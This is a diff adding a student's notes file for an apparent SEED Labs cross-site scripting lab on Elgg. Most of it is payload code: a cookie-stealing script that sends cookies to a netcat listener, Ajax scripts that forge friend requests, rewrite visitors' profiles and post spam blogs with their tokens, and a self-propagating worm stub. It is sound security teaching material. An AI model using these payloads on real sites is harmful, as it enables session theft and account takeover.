@@ -1,0 +1,123 @@
+Setup your environemnt:
+-------------------------------------------------------------------------------
+Adding DNS records:
+sudo su
+chmod 777 hosts
+mousepad hosts
+<copy paste the following record and save>
+10.9.0.5 www.seed-server.com
+
+Get labsetup files
+wget https://seedsecuritylabs.org/Labs_20.04/Files/Web_XSS_Elgg/Labsetup.zip
+docker-compose build
+docker-compose up
+
+Practice Scripts:
+-------------------------------------------------------------------------------
+P 1:
+<script>alert('XSS');</script>
+
+P 2:
+<script>alert(document.cookie);</script>
+
+P 3:
+nc -lknv 5555
+
+<script>document.write('<img src=http://127.0.0.1:5555?c='
++ escape(document.cookie) + ' >');
+</script> 
+
+Task 1:
+-------------------------------------------------------------------------------- 
+<script type="text/javascript">
+	window.onload = function () {
+	var Ajax=null;
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	//Construct the HTTP request to add Samy as a friend.
+
+	var sendurl=...; //FILL IN
+
+	//Create and send Ajax request to add friend
+	Ajax=new XMLHttpRequest();
+	Ajax.open("GET",sendurl,true);
+	Ajax.setRequestHeader("Host","www.seed-server.com");
+	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+	Ajax.send();
+	}
+</script>
+
+Task 2:
+<script type="text/javascript">
+	window.onload = function(){
+    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+    var name="&name="+elgg.session.user.name;
+    var description="&description=1905113";
+    var briefdescription="&briefdescription=briefdescription_set_by_1905113";
+    var location="&location=location_set_by_1905113";
+    var interests="&interests=interests_set_by_1905113";
+    var skills="&skills=skills_set_by_1905113";
+    var contactemail="&contactemail=1905113@example.com";
+    var phone="&phone=+1234567890";
+    var mobile="&mobile=+1905113";
+    var website="&website=www.1905113.com";
+    var twitter="&twitter=twitter_set_by_1905113";
+    var guid="&guid="+elgg.session.user.guid;
+	var content=token+ts+name+description+briefdescription+location+interests+skills+contactemail+phone+mobile+website+twitter+guid; //FILL IN
+	owner_id=elgg.page_owner.guid;
+	visitor_id=elgg.session.user.guid;
+	
+	if(owner_id!=visitor_id)
+	{
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+}
+</script>
+
+Task 3:
+<script type="text/javascript">
+	window.onload = function(){
+    var sendurl="http://www.seed-server.com/action/blog/save"; //FILL IN
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	owner_id=elgg.page_owner.guid;
+	visitor_id=elgg.session.user.guid;
+
+    var title="&title=Are you looking for job?";
+    var container_guid="&container_guid="+visitor_id;
+    var comments_on="&comments_on=On";
+    var status="&status=published";
+
+    var description="&description=To earn 12 USD/hour(!), <a href='http://www.seed-server.com/profile/samy'>Visit Now</a> <br> http://www.seed-server.com/profile/samy";
+	var content=token+ts+title+description+comments_on+status+container_guid; //FILL IN
+	
+	
+	if(owner_id!=visitor_id)
+	{
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+}
+</script>
+
+Task 4:
+<script id=worm>
+	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+	var jsCode = document.getElementById("worm").innerHTML;
+	var tailTag = "</" + "script>";
+	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+	alert(jsCode);
+</script>
